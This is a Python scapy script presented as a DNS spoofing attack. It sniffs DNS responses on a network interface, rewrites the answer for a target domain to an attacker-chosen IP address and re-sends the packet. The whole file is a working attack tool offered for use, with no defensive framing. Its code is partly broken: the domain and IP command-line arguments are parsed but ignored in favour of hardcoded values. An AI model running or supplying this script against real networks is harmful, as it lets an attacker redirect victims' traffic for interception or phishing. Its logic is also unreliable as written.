from scapy.all import *
import argparse

def process_packet(packet):
    if DNSRR in packet and packet[DNS].qr == 1:
        qname = packet[DNSQR].qname.decode()
        if "example.com" in qname:  # Replace with the target domain
            spoofed_ip = "192.168.1.100"  # Replace with the IP you want to spoof
            packet[DNS].an = DNSRR(rrname=qname, type='A', rdata=spoofed_ip, ttl=259200)
            packet[DNS].ancount = 1
            del packet[IP].chksum
            del packet[UDP].chksum
            send(packet)

def dns_spoofing(interface, target_domain, spoofed_ip):
    sniff(iface=interface, prn=process_packet, filter="udp port 53", store=0)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="DNS Spoofing Attack")
    parser.add_argument("interface", help="Network interface to listen on")
    parser.add_argument("target_domain", help="Target domain to spoof")
    parser.add_argument("spoofed_ip", help="IP address to spoof the target domain to")
    args = parser.parse_args()

    dns_spoofing(args.interface, args.target_domain, args.spoofed_ip)